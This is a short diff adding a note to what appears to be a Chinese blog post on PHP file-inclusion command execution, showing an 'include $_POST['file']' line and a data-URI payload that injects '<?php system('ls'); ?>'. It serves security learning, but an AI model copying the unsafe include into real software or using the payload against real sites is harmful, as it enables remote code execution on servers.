@@ -42,3 +42,16 @@ repost:
 <!--more-->	
 
 [toc]
+
+
+
+include 命令执行
+
+~~~ php
+include $_POST['file'];
+
+file=data:*//text/plain,<?php system('ls'); ?>*
+~~~
+
+
+
